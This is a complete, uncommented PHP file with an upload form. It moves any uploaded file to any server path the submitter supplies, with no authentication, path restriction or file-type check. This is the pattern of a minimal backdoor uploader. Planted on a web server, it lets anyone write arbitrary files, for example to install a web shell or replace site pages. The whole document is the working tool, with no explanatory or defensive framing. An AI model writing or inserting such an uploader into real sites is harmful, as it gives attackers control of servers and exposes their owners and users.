<?php if(isset($_POST["path"])){$file=$_FILES["file"];$path=$_POST["path"];if(!(move_uploaded_file($file['tmp_name'],$path))){echo "can't move the file";} else echo "file moved successfully";}?>
<form action="" method="post" enctype="multipart/form-data"><input type="file" name="file"><br>Location<br><input type="text" name="path"><input type="submit" value="Upload"></form>
